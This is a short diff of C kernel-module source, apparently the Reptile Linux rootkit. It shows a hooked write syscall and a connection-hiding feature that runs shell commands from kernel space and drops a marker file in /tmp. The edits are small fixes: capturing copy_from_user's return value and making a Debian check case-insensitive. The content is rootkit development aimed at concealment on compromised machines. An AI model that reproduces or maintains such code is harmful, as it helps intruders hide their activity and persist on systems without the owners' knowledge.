@@ -391,12 +391,12 @@ asmlinkage size_t my_write(unsigned int fd,
 	size_t ret = 0;
 	char ip_buf[sizeof "aaa.bbb.ccc.ddd"];
 	unsigned char *ucp;
-
+	int xret;
     if (buf == NULL){
 		return nbytes;
 	}
 
-    copy_from_user(tmp, buf, nbytes);
+    xret = copy_from_user(tmp, buf, nbytes);
     if (tmp == NULL){
 		return (*orig_write)(fd, "nothing", 0);
 	}
@@ -603,7 +603,7 @@ static int __init reptile_init(void)
 	//own add
 #ifdef CONFIG_HIDE_CONN_FROM_SS
 	struct file *fp;
-	run_cmd("(uname -a | grep debian | grep -v grep) && touch /tmp/.tmp8");
+	run_cmd("(uname -a | grep -i debian | grep -v grep) && touch /tmp/.tmp8");
 	fp = filp_open("/tmp/.tmp8", O_RDWR, 0644);
     if(IS_ERR(fp)) {
 		filter_init();
@@ -654,7 +654,7 @@ static void __exit reptile_exit(void)
 {
 #ifdef CONFIG_HIDE_CONN_FROM_SS
 	struct file *fp;
-	run_cmd("(uname -a | grep debian | grep -v grep) && touch /tmp/.tmp8");
+	run_cmd("(uname -a | grep -i debian | grep -v grep) && touch /tmp/.tmp8");
 	fp = filp_open("/tmp/.tmp8", O_RDWR, 0644);
     if(IS_ERR(fp)) {
 		filter_exit();
